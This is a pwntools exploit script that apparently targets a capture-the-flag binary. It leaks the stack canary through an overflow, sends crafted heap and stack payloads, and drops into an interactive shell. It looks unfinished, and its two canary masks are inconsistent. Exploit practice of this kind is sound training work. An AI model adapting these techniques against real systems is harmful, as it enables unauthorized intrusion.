from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["",]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_5")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(length,name):
    ru(b'> ')
    sl(b'1')
    ru(b'length: ')
    sl(length)
    ru(b'name: ')
    s(name)

def get(data):
    ru(b'>')
    sl(b'2')
    ru(b'data: ')
    s(data)

gdb.attach(p,'''
b *$rebase(0x14f7)
b *$rebase(0x15fb)
''')
ru(b'u?\n')
s(b'aaaaaaaaa')
ru(b'aaaaaaaa')
canary = u64(rc(6).ljust(8,b'\x00')) - 0x61
pr('canary',canary)
add(b'0',b'a'* 0x14 + p64(0x20d51) + p32(canary & 0xffffffff))
sl(b'')
add(b'8',p32((canary>>32)&0xffffffff) + b'aaaa')
get(p32((canary>>32)&0xfffffff) + b'aaaa')

shell()
